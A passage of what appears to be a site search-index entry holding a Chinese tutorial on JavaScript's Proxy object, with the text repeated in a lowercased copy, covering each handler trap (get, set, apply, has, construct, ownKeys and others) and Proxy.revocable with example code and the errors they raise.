function(target, propKey) {\n        if (propKey in target) {\n            return target[propKey];\n        } else {\n            throw new ReferenceError(\"Prop name \\\"\" + propKey + \"\\\" does not exist.\");\n        }\n    }\n});\n\nproxy.name // \"张三\"\nproxy.age // 抛出一个错误\n\nconst proxy = new Proxy({}, {\n    get: function(target, key, receiver) {\n        return receiver;\n    }\n});\n\nconst d = Object.create(proxy);\nd.a === d // true\n\n\n\n# set()\n\n> set方法用来拦截某个属性的赋值操作，可以接受四个参数，\n\n * 目标对象\n * 属性名\n * 属性值\n * proxy 实例本身(可选)\n\n# 例子\n\n> 假定Person对象有一个age属性，该属性应该是一个不大于 200 的整数，那么可以使用Proxy保证age的属性值符合要求。\n\nlet validator = {\n    set: function(obj, prop, value) {\n        if (prop === 'age') {\n            if (!Number.isInteger(value)) {\n                throw new TypeError('The age is not an integer');\n            }\n            if (value > 200) {\n                throw new RangeError('The age seems invalid');\n            }\n        }\n\n        // 对于满足条件的 age 属性以及其他属性，直接保存\n        obj[prop] = value;\n        return true;\n    }\n};\n\nlet person = new Proxy({}, validator);\n\nperson.age = 100;\n\nperson.age // 100\nperson.age = 'young' // 报错\nperson.age = 300 // 报错\n\n\n> set方法的第四个参数receiver 一般情况下是proxy实例本身\n\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = receiver;\n        return true;\n    }\n};\nconst proxy = new Proxy({}, handler);\nconst myObj = {};\nObject.setPrototypeOf(myObj, proxy);\n\nmyObj.foo = 'bar';\nmyObj.foo === myObj // true\n// myObj的原型对象proxy是一个 Proxy 实例，设置它的foo属性会触发set方法。这时，第四个参数receiver就指向原始赋值行为所在的对象myObj。\n\n\nWARNING\n\n如果目标对象自身的某个属性不可写，那么set方法将不起作用。\n\nconst obj = {};\nObject.defineProperty(obj, 'foo', {\n    value: 'bar',\n    writable: false\n});\n\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = 'baz';\n        return true;\n    }\n};\n\nconst proxy = new Proxy(obj, handler);\nproxy.foo = 'baz';\nproxy.foo // \"bar\"\n\n\nset代理应当返回一个布尔值。严格模式下，set代理如果没有返回true，就会报错。\n\n'use strict';\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = receiver;\n        // 无论有没有下面这一行，都会报错\n        return false;\n    }\n};\nconst proxy = new Proxy({}, handler);\nproxy.foo = 'bar';\n// TypeError: 'set' on proxy: trap returned falsish for property 'foo'\n\n\n\n# apply()\n\n> apply方法拦截函数的调用、call和apply操作。\n\napply 方法可以接受三个参数\n\n * 目标对象\n * 目标对象的上下文对象（this）\n * 目标对象的参数数组\n\nvar handler = {\n    apply(target, ctx, args) {\n        return Reflect.apply(...arguments);\n    }\n};\n\n// ---\nvar target = function() {\n    return 'I am the target';\n};\nvar handler = {\n    apply: function() {\n        return 'I am the proxy';\n    }\n};\n\nvar p = new Proxy(target, handler);\n// 变量p是 Proxy 的实例，当它作为函数调用时（p()），就会被apply方法拦截，返回一个字符串。\np()\n// \"I am the proxy\"\n\n// ---\nvar twice = {\n    apply(target, ctx, args) {\n        return Reflect.apply(...arguments) * 2;\n    }\n};\n\nfunction sum(left, right) {\n    return left + right;\n};\nvar proxy = new Proxy(sum, twice);\nproxy(1, 2) // 6\nproxy.call(null, 5, 6) // 22\nproxy.apply(null, [7, 8]) // 30\n\n// ---\nReflect.apply(proxy, null, [9, 10]) // 38\n\n\n\n# has()\n\n> has() 方法用来拦截HasProperty操作，即判断对象是否具有某个属性时，这个方法会生效。典型的操作就是in运算符\n\nhas() 方法可以接受两个参数\n\n * 目标对象\n * 需查询的属性名\n\nvar handler = {\n    has(target, key) {\n        if (key[0] === '_') {\n            return false;\n        }\n        return key in target;\n    }\n};\nvar target = {\n    _prop: 'foo',\n    prop: 'foo'\n};\nvar proxy = new Proxy(target, handler);\n'_prop' in proxy // false\n\n\nWARNING\n\n值得注意的是，has()方法拦截的是HasProperty操作，而不是HasOwnProperty操作，即has()方法不判断一个属性是对象自身的属性，还是继承的属性。\n\n另外，虽然for...in循环也用到了in运算符，但是has()拦截对for...in循环不生效。\n\nlet stu1 = {\n    name: '张三',\n    score: 59\n};\nlet stu2 = {\n    name: '李四',\n    score: 99\n};\n\nlet handler = {\n    has(target, prop) {\n        if (prop === 'score' && target[prop] < 60) {\n            console.log(`${target.name} 不及格`);\n            return false;\n        }\n        return prop in target;\n    }\n}\n\nlet oproxy1 = new Proxy(stu1, handler);\nlet oproxy2 = new Proxy(stu2, handler);\n\n'score' in oproxy1\n    // 张三 不及格\n    // false\n\n    'score' in oproxy2\n// true\n\nfor (let a in oproxy1) {\n    console.log(oproxy1[a]);\n}\n// 张三\n// 59\n\nfor (let b in oproxy2) {\n    console.log(oproxy2[b]);\n}\n// 李四\n// 99\n\n\n\n# construct()\n\n> construct()方法用于拦截new命令，下面是拦截对象的写法。\n\nconstruct() 方法可以接受三个参数。\n\n * target：目标对象。\n * args：构造函数的参数数组。\n * newTarget：创造实例对象时，new命令作用的构造函数（下面例子的p）。\n\nconst p = new Proxy(function() {}, {\n    construct: function(target, args) {\n        console.log('called: ' + args.join(', '));\n        return {\n            value: args[0] * 10\n        };\n    }\n});\n\n(new p(1)).value\n// \"called: 1\"\n// 10\n\n\nWARNING\n\nconstruct() 方法返回的必须是一个对象，否则会报错。\n\nconst p = new Proxy(function() {}, {\n    construct: function(target, argumentsList) {\n        return 1;\n    }\n});\n\nnew p() // 报错\n// Uncaught TypeError: 'construct' on proxy: trap returned non-object ('1')\n\n\n由于 construct() 拦截的是构造函数，所以它的目标对象必须是函数，否则就会报错。\n\nconst p = new Proxy({}, {\n    construct: function(target, argumentsList) {\n        return {};\n    }\n});\n\nnew p() // 报错\n// Uncaught TypeError: p is not a constructor\n\n\nconstruct() 方法中的this指向的是handler，而不是实例对象。\n\nconst handler = {\n    construct: function(target, args) {\n        console.log(this === handler);\n        return new target(...args);\n    }\n}\n\nlet p = new Proxy(function() {}, handler);\nnew p() // true\n\n\n\n# deleteProperty()\n\n> deleteProperty 方法用于拦截 delete 操作，如果这个方法抛出错误或者返回 false ，当前属性就无法被 delete 命令删除。\n\nvar handler = {\n    deleteProperty(target, key) {\n        invariant(key, 'delete');\n        delete target[key];\n        return true;\n    }\n};\n\nfunction invariant(key, action) {\n    if (key[0] === '_') {\n        throw new Error(`Invalid attempt to ${action} private \"${key}\" property`);\n    }\n}\n\nvar target = {\n    _prop: 'foo'\n};\nvar proxy = new Proxy(target, handler);\ndelete proxy._prop\n// Error: Invalid attempt to delete private \"_prop\" property\n\n// deleteProperty方法拦截了delete操作符，删除第一个字符为下划线的属性会报错。\n\n\nWARNING\n\n目标对象自身的不可配置（configurable）的属性，不能被deleteProperty方法删除，否则报错。\n\n\n# deleteProperty()\n\n> defineProperty() 方法拦截了Object.defineProperty()操作。\n\nvar handler = {\n    defineProperty(target, key, descriptor) {\n        return false;\n    }\n};\nvar target = {};\nvar proxy = new Proxy(target, handler);\nproxy.foo = 'bar' // \n\n// 上面代码中，defineProperty()方法内部没有任何操作，只返回false，导致添加新属性总是无效。\n// 注意，这里的false只是用来提示操作失败，本身并不能阻止添加新属性。\n\n\nWARNING\n\n如果目标对象不可扩展（non-extensible），则defineProperty()不能增加目标对象上不存在的属性，否则会报错。另外，如果目标对象的某个属性不可写（writable）或不可配置（configurable），则defineProperty()方法不得改变这两个设置。\n\n\n# getOwnPropertyDescriptor()\n\n> getOwnPropertyDescriptor() 方法拦截 Object.getOwnPropertyDescriptor() ，返回一个属性描述对象或者 undefined 。\n\nvar handler = {\n    getOwnPropertyDescriptor(target, key) {\n        if (key[0] === '_') {\n            return;\n        }\n        return Object.getOwnPropertyDescriptor(target, key);\n    }\n};\nvar target = {\n    _foo: 'bar',\n    baz: 'tar'\n};\nvar proxy = new Proxy(target, handler);\nObject.getOwnPropertyDescriptor(proxy, 'wat')\n// undefined\nObject.getOwnPropertyDescriptor(proxy, '_foo')\n// undefined\nObject.getOwnPropertyDescriptor(proxy, 'baz')\n// { value: 'tar', writable: true, enumerable: true, configurable: true }\n\n// handler.getOwnPropertyDescriptor()方法对于第一个字符为下划线的属性名会返回undefined。\n\n\n\n# getPrototypeOf()\n\n> getPrototypeOf() 方法主要用来拦截获取对象原型。具体来说，拦截下面这些操作。\n\n * Object.prototype.__proto__\n\n * Object.prototype.isPrototypeOf()\n\n * Object.getPrototypeOf()\n\n * Reflect.getPrototypeOf()\n\n * instanceof\n\n例子\n\nvar proto = {};\nvar p = new Proxy({}, {\n    getPrototypeOf(target) {\n        return proto;\n    }\n});\nObject.getPrototypeOf(p) === proto // true\n\n// getPrototypeOf()方法拦截Object.getPrototypeOf()，返回proto对象。\n\n\nWARNING\n\ngetPrototypeOf() 方法的返回值必须是对象或者null，否则报错。另外，如果目标对象不可扩展（non-extensible）， getPrototypeOf() 方法必须返回目标对象的原型对象。\n\n\n# isExtensible()\n\n> isExtensible() 方法拦截 Object.isExtensible() 操作。\n\nvar p = new Proxy({}, {\n    isExtensible: function(target) {\n        console.log(\"called\");\n        return true;\n    }\n});\n\nObject.isExtensible(p)\n// \"called\"\n// true\n\n\nWARNING\n\n该方法只能返回布尔值，否则返回值会被自动转为布尔值。\n\n这个方法有一个强限制，它的返回值必须与目标对象的isExtensible属性保持一致，否则就会抛出错误。\n\nObject.isExtensible(proxy) === Object.isExtensible(target)\n\nvar p = new Proxy({}, {\n    isExtensible: function(target) {\n        return false;\n    }\n});\n\nObject.isExtensible(p)\n// Uncaught TypeError: 'isExtensible' on proxy: trap result does not reflect extensibility of proxy target (which is 'true')\n\n\n\n# ownKeys()\n\n> ownKeys() 方法用来拦截对象自身属性的读取操作。具体来说，拦截以下操作。\n\n * Object.getOwnPropertyNames()\n * Object.getOwnPropertySymbols()\n * Object.keys()\n * for...in循环\n\nlet target = {\n    a: 1,\n    b: 2,\n    c: 3\n};\n\nlet handler = {\n    ownKeys(target) {\n        return ['a'];\n    }\n};\n\nlet proxy = new Proxy(target, handler);\n\nObject.keys(proxy)\n// [ 'a' ]\n\n\nWARNING\n\n使用 Object.keys() 方法时，有三类属性会被ownKeys()方法自动过滤，不会返回。\n\n * 目标对象上不存在的属性\n * 属性名为 Symbol 值\n * 不可遍历（enumerable）的属性\n\nlet target = {\n    a: 1,\n    b: 2,\n    c: 3,\n    [Symbol.for('secret')]: '4',\n};\n\nObject.defineProperty(target, 'key', {\n    enumerable: false,\n    configurable: true,\n    writable: true,\n    value: 'static'\n});\n\nlet handler = {\n    ownKeys(target) {\n        return ['a', 'd', Symbol.for('secret'), 'key'];\n    }\n};\n\nlet proxy = new Proxy(target, handler);\n\nObject.keys(proxy)\n// ['a']\n// ownKeys()方法之中，显式返回不存在的属性（d）、Symbol 值（Symbol.for('secret')）、不可遍历的属性（key），结果都被自动过滤掉。\n\n\n> ownKeys()方法还可以拦截Object.getOwnPropertyNames()。\n\nvar p = new Proxy({}, {\n    ownKeys: function(target) {\n        return ['a', 'b', 'c'];\n    }\n});\n\nObject.getOwnPropertyNames(p)\n// [ 'a', 'b', 'c' ]\n\n\n> for...in循环也受到ownKeys()方法的拦截。\n\nconst obj = {\n    hello: 'world'\n};\nconst proxy = new Proxy(obj, {\n    ownKeys: function() {\n        return ['a', 'b'];\n    }\n});\n\nfor (let key in proxy) {\n    console.log(key); // 没有任何输出\n}\n\n\nWARNING\n\nownKeys() 方法返回的数组成员，只能是字符串或 Symbol 值。如果有其他类型的值，或者返回的根本不是数组，就会报错。\n\nvar obj = {};\n\nvar p = new Proxy(obj, {\n    ownKeys: function(target) {\n        return [123, true, undefined, null, {},\n            []\n        ];\n    }\n});\n\nObject.getOwnPropertyNames(p)\n// Uncaught TypeError: 123 is not a valid property name\n\n\n如果目标对象自身包含不可配置的属性，则该属性必须被 ownKeys() 方法返回，否则报错。\n\nvar obj = {};\nObject.defineProperty(obj, 'a', {\n    configurable: false,\n    enumerable: true,\n    value: 10\n});\n\nvar p = new Proxy(obj, {\n    ownKeys: function(target) {\n        return ['b'];\n    }\n});\n\nObject.getOwnPropertyNames(p)\n// Uncaught TypeError: 'ownKeys' on proxy: trap result did not include 'a'\n\n// obj对象是不可扩展的，这时ownKeys()方法返回的数组之中，包含了obj对象的多余属性b，所以导致了报错。\n\n\n\n# preventExtensions()\n\n> preventExtensions() 方法拦截 Object.preventExtensions() 。该方法必须返回一个布尔值，否则会被自动转为布尔值。\n\n这个方法有一个限制，只有目标对象不可扩展时（即 Object.isExtensible(proxy) 为false）， proxy.preventExtensions 才能返回true，否则会报错。\n\nvar proxy = new Proxy({}, {\n    preventExtensions: function(target) {\n        return true;\n    }\n});\n\nObject.preventExtensions(proxy)\n// Uncaught TypeError: 'preventExtensions' on proxy: trap returned truish but the proxy target is extensible\n\n\n\n# setPrototypeOf()\n\n> setPrototypeOf()方法主要用来拦截Object.setPrototypeOf()方法。\n\nvar handler = {\n    setPrototypeOf(target, proto) {\n        throw new Error('Changing the prototype is forbidden');\n    }\n};\nvar proto = {};\nvar target = function() {};\nvar proxy = new Proxy(target, handler);\nObject.setPrototypeOf(proxy, proto);\n// Error: Changing the prototype is forbidden\n\n\n\n# Proxy.revocable()\n\n> Proxy.revocable() 方法返回一个可取消的 Proxy 实例。\n\nlet target = {};\nlet handler = {};\n\nlet {\n    proxy,\n    revoke\n} = Proxy.revocable(target, handler);\n\nproxy.foo = 123;\nproxy.foo // 123\n\nrevoke();\nproxy.foo // TypeError: Revoked\n\n\nProxy.revocable() 方法返回一个对象，该对象的 proxy 属性是 Proxy 实例， revoke 属性是一个函数，可以取消 Proxy 实例。上面代码中，当执行 revoke 函数之后，再访问 Proxy 实例，就会抛出一个错误。\n\nProxy.revocable() 的一个使用场景是，目标对象不允许直接访问，必须通过代理访问，一旦访问结束，就收回代理权，不允许再次访问。\n\n\n# this 问题\n\n> 虽然 Proxy 可以代理针对目标对象的访问，但它不是目标对象的透明代理，即不做任何拦截的情况下，也无法保证与目标对象的行为一致。主要原因就是在 Proxy 代理的情况下，目标对象内部的 this 关键字会指向 Proxy 代理。\n\nconst target = {\n    m: function() {\n        console.log(this === proxy);\n    }\n};\nconst handler = {};\n\nconst proxy = new Proxy(target, handler);\n\ntarget.m() // false\nproxy.m() // true\n\nconst target = new Date('2015-01-01');\nconst handler = {\n    get(target, prop) {\n        if (prop === 'getDate') {\n            return target.getDate.bind(target);\n        }\n        return Reflect.get(target, prop);\n    }\n};\nconst proxy = new Proxy(target, handler);\n\nproxy.getDate() // 1\n",normalizedContent:"# proxy\n\n\n# 概述\n\n> proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写。proxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，可以译为“代理器”。\n\n\n# 例子\n\nvar proxy = new proxy({}, {\n    get: function(target, propkey) {\n        return 35;\n    }\n});\n\nproxy.time // 35\nproxy.name // 35\nproxy.title // 35\n\n// 如果handler没有设置任何拦截，那就等同于直接通向原对象。\nvar target = {};\nvar handler = {};\nvar proxy = new proxy(target, handler);\nproxy.a = 'b';\ntarget.a // \"b\"\n\n\nproxy 接受两个参数。\n\n * target 参数是所要代理的目标对象（上例是一个空对象），即如果没有proxy的介入，操作原来要访问的就是这个对象；\n * handler 参数是一个配置对象，对于每一个被代理的操作，需要提供一个对应的处理函数，该函数将拦截对应的操作。\n\nwarning\n\n注意，要使得proxy起作用，必须针对proxy实例（上例是proxy对象）进行操作，而不是针对目标对象（上例是空对象）进行操作。\n\n如果handler没有设置任何拦截，那就等同于直接通向原对象。\n\n\n# proxy 实例的方法\n\n\n# get()\n\n> 用于拦截某个属性的读取操作，可接受三个参数。\n\n * 目标对象\n * 属性名\n * proxy 实例本身(可选)\n\nvar person = {\n    name: \"张三\"\n};\n\nvar proxy = new proxy(person, {\n    get: function(target, propkey) {\n        if (propkey in target) {\n            return target[propkey];\n        } else {\n            throw new referenceerror(\"prop name \\\"\" + propkey + \"\\\" does not exist.\");\n        }\n    }\n});\n\nproxy.name // \"张三\"\nproxy.age // 抛出一个错误\n\nconst proxy = new proxy({}, {\n    get: function(target, key, receiver) {\n        return receiver;\n    }\n});\n\nconst d = object.create(proxy);\nd.a === d // true\n\n\n\n# set()\n\n> set方法用来拦截某个属性的赋值操作，可以接受四个参数，\n\n * 目标对象\n * 属性名\n * 属性值\n * proxy 实例本身(可选)\n\n# 例子\n\n> 假定person对象有一个age属性，该属性应该是一个不大于 200 的整数，那么可以使用proxy保证age的属性值符合要求。\n\nlet validator = {\n    set: function(obj, prop, value) {\n        if (prop === 'age') {\n            if (!number.isinteger(value)) {\n                throw new typeerror('the age is not an integer');\n            }\n            if (value > 200) {\n                throw new rangeerror('the age seems invalid');\n            }\n        }\n\n        // 对于满足条件的 age 属性以及其他属性，直接保存\n        obj[prop] = value;\n        return true;\n    }\n};\n\nlet person = new proxy({}, validator);\n\nperson.age = 100;\n\nperson.age // 100\nperson.age = 'young' // 报错\nperson.age = 300 // 报错\n\n\n> set方法的第四个参数receiver 一般情况下是proxy实例本身\n\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = receiver;\n        return true;\n    }\n};\nconst proxy = new proxy({}, handler);\nconst myobj = {};\nobject.setprototypeof(myobj, proxy);\n\nmyobj.foo = 'bar';\nmyobj.foo === myobj // true\n// myobj的原型对象proxy是一个 proxy 实例，设置它的foo属性会触发set方法。这时，第四个参数receiver就指向原始赋值行为所在的对象myobj。\n\n\nwarning\n\n如果目标对象自身的某个属性不可写，那么set方法将不起作用。\n\nconst obj = {};\nobject.defineproperty(obj, 'foo', {\n    value: 'bar',\n    writable: false\n});\n\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = 'baz';\n        return true;\n    }\n};\n\nconst proxy = new proxy(obj, handler);\nproxy.foo = 'baz';\nproxy.foo // \"bar\"\n\n\nset代理应当返回一个布尔值。严格模式下，set代理如果没有返回true，就会报错。\n\n'use strict';\nconst handler = {\n    set: function(obj, prop, value, receiver) {\n        obj[prop] = receiver;\n        // 无论有没有下面这一行，都会报错\n        return false;\n    }\n};\nconst proxy = new proxy({}, handler);\nproxy.foo = 'bar';\n// typeerror: 'set' on proxy: trap returned falsish for property 'foo'\n\n\n\n# apply()\n\n> apply方法拦截函数的调用、call和apply操作。\n\napply 方法可以接受三个参数\n\n * 目标对象\n * 目标对象的上下文对象（this）\n * 目标对象的参数数组\n\nvar handler = {\n    apply(target, ctx, args) {\n        return reflect.apply(...arguments);\n    }\n};\n\n// ---\nvar target = function() {\n    return 'i am the target';\n};\nvar handler = {\n    apply: function() {\n        return 'i am the proxy';\n    }\n};\n\nvar p = new proxy(target, handler);\n// 变量p是 proxy 的实例，当它作为函数调用时（p()），就会被apply方法拦截，返回一个字符串。\np()\n// \"i am the proxy\"\n\n// ---\nvar twice = {\n    apply(target, ctx, args) {\n        return reflect.apply(...arguments) * 2;\n    }\n};\n\nfunction sum(left, right) {\n    return left + right;\n};\nvar proxy = new proxy(sum, twice);\nproxy(1, 2) // 6\nproxy.call(null, 5, 6) // 22\nproxy.apply(null, [7, 8]) // 30\n\n// ---\nreflect.apply(proxy, null, [9, 10]) // 38\n\n\n\n# has()\n\n> has() 方法用来拦截hasproperty操作，即判断对象是否具有某个属性时，这个方法会生效。典型的操作就是in运算符\n\nhas() 方法可以接受两个参数\n\n * 目标对象\n * 需查询的属性名\n\nvar handler = {\n    has(target, key) {\n        if (key[0] === '_') {\n            return false;\n        }\n        return key in target;\n    }\n};\nvar target = {\n    _prop: 'foo',\n    prop: 'foo'\n};\nvar proxy = new proxy(target, handler);\n'_prop' in proxy // false\n\n\nwarning\n\n值得注意的是，has()方法拦截的是hasproperty操作，而不是hasownproperty操作，即has()方法不判断一个属性是对象自身的属性，还是继承的属性。\n\n另外，虽然for...in循环也用到了in运算符，但是has()拦截对for...in循环不生效。\n\nlet stu1 = {\n    name: '张三',\n    score: 59\n};\nlet stu2 = {\n    name: '李四',\n    score: 99\n};\n\nlet handler = {\n    has(target, prop) {\n        if (prop === 'score' && target[prop] < 60) {\n            console.log(`${target.name} 不及格`);\n            return false;\n        }\n        return prop in target;\n    }\n}\n\nlet oproxy1 = new proxy(stu1, handler);\nlet oproxy2 = new proxy(stu2, handler);\n\n'score' in oproxy1\n    // 张三 不及格\n    // false\n\n    'score' in oproxy2\n// true\n\nfor (let a in oproxy1) {\n    console.log(oproxy1[a]);\n}\n// 张三\n// 59\n\nfor (let b in oproxy2) {\n    console.log(oproxy2[b]);\n}\n// 李四\n// 99\n\n\n\n# construct()\n\n> construct()方法用于拦截new命令，下面是拦截对象的写法。\n\nconstruct() 方法可以接受三个参数。\n\n * target：目标对象。\n * args：构造函数的参数数组。\n * newtarget：创造实例对象时，new命令作用的构造函数（下面例子的p）。\n\nconst p = new proxy(function() {}, {\n    construct: function(target, args) {\n        console.log('called: ' + args.join(', '));\n        return {\n            value: args[0] * 10\n        };\n    }\n});\n\n(new p(1)).value\n// \"called: 1\"\n// 10\n\n\nwarning\n\nconstruct() 方法返回的必须是一个对象，否则会报错。\n\nconst p = new proxy(function() {}, {\n    construct: function(target, argumentslist) {\n        return 1;\n    }\n});\n\nnew p() // 报错\n// uncaught typeerror: 'construct' on proxy: trap returned non-object ('1')\n\n\n由于 construct() 拦截的是构造函数，所以它的目标对象必须是函数，否则就会报错。\n\nconst p = new proxy({}, {\n    construct: function(target, argumentslist) {\n        return {};\n    }\n});\n\nnew p() // 报错\n// uncaught typeerror: p is not a constructor\n\n\nconstruct() 方法中的this指向的是handler，而不是实例对象。\n\nconst handler = {\n    construct: function(target, args) {\n        console.log(this === handler);\n        return new target(...args);\n    }\n}\n\nlet p = new proxy(function() {}, handler);\nnew p() // true\n\n\n\n# deleteproperty()\n\n> deleteproperty 方法用于拦截 delete 操作，如果这个方法抛出错误或者返回 false ，当前属性就无法被 delete 命令删除。\n\nvar handler = {\n    deleteproperty(target, key) {\n        invariant(key, 'delete');\n        delete target[key];\n        return true;\n    }\n};\n\nfunction invariant(key, action) {\n    if (key[0] === '_') {\n        throw new error(`invalid attempt to ${action} private \"${key}\" property`);\n    }\n}\n\nvar target = {\n    _prop: 'foo'\n};\nvar proxy = new proxy(target, handler);\ndelete proxy._prop\n// error: invalid attempt to delete private \"_prop\" property\n\n// deleteproperty方法拦截了delete操作符，删除第一个字符为下划线的属性会报错。\n\n\nwarning\n\n目标对象自身的不可配置（configurable）的属性，不能被deleteproperty方法删除，否则报错。\n\n\n# deleteproperty()\n\n> defineproperty() 方法拦截了object.defineproperty()操作。\n\nvar handler = {\n    defineproperty(target, key, descriptor) {\n        return false;\n    }\n};\nvar target = {};\nvar proxy = new proxy(target, handler);\nproxy.foo = 'bar' // \n\n// 上面代码中，defineproperty()方法内部没有任何操作，只返回false，导致添加新属性总是无效。\n// 注意，这里的false只是用来提示操作失败，本身并不能阻止添加新属性。\n\n\nwarning\n\n如果目标对象不可扩展（non-extensible），则defineproperty()不能增加目标对象上不存在的属性，否则会报错。另外，如果目标对象的某个属性不可写（writable）或不可配置（configurable），则defineproperty()方法不得改变这两个设置。\n\n\n# getownpropertydescriptor()\n\n> getownpropertydescriptor() 方法拦截 object.getownpropertydescriptor() ，返回一个属性描述对象或者 undefined 。\n\nvar handler = {\n    getownpropertydescriptor(target, key) {\n        if (key[0] === '_') {\n            return;\n        }\n        return object.getownpropertydescriptor(target, key);\n    }\n};\nvar target = {\n    _foo: 'bar',\n    baz: 'tar'\n};\nvar proxy = new proxy(target, handler);\nobject.getownpropertydescriptor(proxy, 'wat')\n// undefined\nobject.getownpropertydescriptor(proxy, '_foo')\n// undefined\nobject.getownpropertydescriptor(proxy, 'baz')\n// { value: 'tar', writable: true, enumerable: true, configurable: true }\n\n// handler.getownpropertydescriptor()方法对于第一个字符为下划线的属性名会返回undefined。\n\n\n\n# getprototypeof()\n\n> getprototypeof() 方法主要用来拦截获取对象原型。具体来说，拦截下面这些操作。\n\n * object.prototype.__proto__\n\n * object.prototype.isprototypeof()\n\n * object.getprototypeof()\n\n * reflect.getprototypeof()\n\n * instanceof\n\n例子\n\nvar proto = {};\nvar p = new proxy({}, {\n    getprototypeof(target) {\n        return proto;\n    }\n});\nobject.getprototypeof(p) === proto // true\n\n// getprototypeof()方法拦截object.getprototypeof()，返回proto对象。\n\n\nwarning\n\ngetprototypeof() 方法的返回值必须是对象或者null，否则报错。另外，如果目标对象不可扩展（non-extensible）， getprototypeof() 方法必须返回目标对象的原型对象。\n\n\n# isextensible()\n\n> isextensible() 方法拦截 object.isextensible() 操作。\n\nvar p = new proxy({}, {\n    isextensible: function(target) {\n        console.log(\"called\");\n        return true;\n    }\n});\n\nobject.isextensible(p)\n// \"called\"\n// true\n\n\nwarning\n\n该方法只能返回布尔值，否则返回值会被自动转为布尔值。\n\n这个方法有一个强限制，它的返回值必须与目标对象的isextensible属性保持一致，否则就会抛出错误。\n\nobject.isextensible(proxy) === object.isextensible(target)\n\nvar p = new proxy({}, {\n    isextensible: function(target) {\n        return false;\n    }\n});\n\nobject.isextensible(p)\n// uncaught typeerror: 'isextensible' on proxy: trap result does not reflect extensibility of proxy target (which is 'true')\n\n\n\n# ownkeys()\n\n> ownkeys() 方法用来拦截对象自身属性的读取操作。具体来说，拦截以下操作。\n\n * object.getownpropertynames()\n * object.getownpropertysymbols()\n * object.keys()\n * for...in循环\n\nlet target = {\n    a: 1,\n    b: 2,\n    c: 3\n};\n\nlet handler = {\n    ownkeys(target) {\n        return ['a'];\n    }\n};\n\nlet proxy = new proxy(target, handler);\n\nobject.keys(proxy)\n// [ 'a' ]\n\n\nwarning\n\n使用 object.keys() 方法时，有三类属性会被ownkeys()方法自动过滤，不会返回。\n\n * 目标对象上不存在的属性\n * 属性名为 symbol 值\n * 不可遍历（enumerable）的属性\n\nlet target = {\n    a: 1,\n    b: 2,\n    c: 3,\n    [symbol.for('secret')]: '4',\n};\n\nobject.defineproperty(target, 'key', {\n    enumerable: false,\n    configurable: true,\n    writable: true,\n    value: 'static'\n});\n\nlet handler = {\n    ownkeys(target) {\n        return ['a', 'd', symbol.for('secret'), 'key'];\n    }\n};\n\nlet proxy = new proxy(target, handler);\n\nobject.keys(proxy)\n// ['a']\n// ownkeys()方法之中，显式返回不存在的属性（d）、symbol 值（symbol.for('secret')）、不可遍历的属性（key），结果都被自动过滤掉。\n\n\n> ownkeys()方法还可以拦截object.getownpropertynames()。\n\nvar p = new proxy({}, {\n    ownkeys: function(target) {\n        return ['a', 'b', 'c'];\n    }\n});\n\nobject.getownpropertynames(p)\n// [ 'a', 'b', 'c' ]\n\n\n> for...in循环也受到ownkeys()方法的拦截。\n\nconst obj = {\n    hello: 'world'\n};\nconst proxy = new proxy(obj, {\n    ownkeys: function() {\n        return ['a', 'b'];\n    }\n});\n\nfor (let key in proxy) {\n    console.log(key); // 没有任何输出\n}\n\n\nwarning\n\nownkeys() 方法返回的数组成员，只能是字符串或 symbol 值。如果有其他类型的值，或者返回的根本不是数组，就会报错。\n\nvar obj = {};\n\nvar p = new proxy(obj, {\n    ownkeys: function(target) {\n        return [123, true, undefined, null, {},\n            []\n        ];\n    }\n});\n\nobject.getownpropertynames(p)\n// uncaught typeerror: 123 is not a valid property name\n\n\n如果目标对象自身包含不可配置的属性，则该属性必须被 ownkeys() 方法返回，否则报错。\n\nvar obj = {};\nobject.defineproperty(obj, 'a', {\n    configurable: false,\n    enumerable: true,\n    value: 10\n});\n\nvar p = new proxy(obj, {\n    ownkeys: function(target) {\n        return ['b'];\n    }\n});\n\nobject.getownpropertynames(p)\n// uncaught typeerror: 'ownkeys' on proxy: trap result did not include 'a'\n\n// obj对象是不可扩展的，这时ownkeys()方法返回的数组之中，包含了obj对象的多余属性b，所以导致了报错。\n\n\n\n# preventextensions()\n\n> preventextensions() 方法拦截 object.preventextensions() 。该方法必须返回一个布尔值，否则会被自动转为布尔值。\n\n这个方法有一个限制，只有目标对象不可扩展时（即 object.isextensible(proxy) 为false）， proxy.preventextensions 才能返回true，否则会报错。\n\nvar proxy = new proxy({}, {\n    preventextensions: function(target) {\n        return true;\n    }\n});\n\nobject.preventextensions(proxy)\n// uncaught typeerror: 'preventextensions' on proxy: trap returned truish but the proxy target is extensible\n\n\n\n# setprototypeof()\n\n> setprototypeof()方法主要用来拦截object.setprototypeof()方法。\n\nvar handler = {\n    setprototypeof(target, proto) {\n        throw new error('changing the prototype is forbidden');\n    }\n};\nvar proto = {};\nvar target = function() {};\nvar proxy = new proxy(target, handler);\nobject.setprototypeof(proxy, proto);\n// error: changing the prototype is forbidden\n\n\n\n# proxy.revocable()\n\n> proxy.revocable() 方法返回一个可取消的 proxy 实例。\n\nlet target = {};\nlet handler = {};\n\nlet {\n    proxy,\n    revoke\n} = proxy.revocable(target, handler);\n\nproxy.foo = 123;\nproxy.foo // 123\n\nrevoke();\nproxy.foo // typeerror: revoked\n\n\nproxy.revocable() 方法返回一个对象，该对象的 proxy 属性是 proxy 实例， revoke 属性是一个函数，可以取消 proxy 实例。上面代码中，当执行 revoke 函数之后，再访问 proxy 实例，就会抛出一个错误。\n\nproxy.revocable() 的一个使用场景是，目标对象不允许直接访问，必须通过代理访问，一旦访问结束，就收回代理权，不允许再次访问。\n\n\n# this 问题\n\n> 虽然 proxy 可以代理针对目标对象的访问，但它不是目标对象的透明代理，即不做任何拦截的情况下，也无法保证与目标对象的行为一致。主要原因就是在 proxy 代理的情况下，目标对象内部的 this 关键字会指向 proxy 代理。\n\nconst target = {\n    m: function() {\n        console.log(this === proxy);\n    }\n};\nconst handler = {};\n\nconst proxy = new proxy(target, handler);\n\ntarget.m() // false\nproxy.m() // true\n\nconst target = new date('2015-01-01');\nconst handler = {\n    get(target, prop) 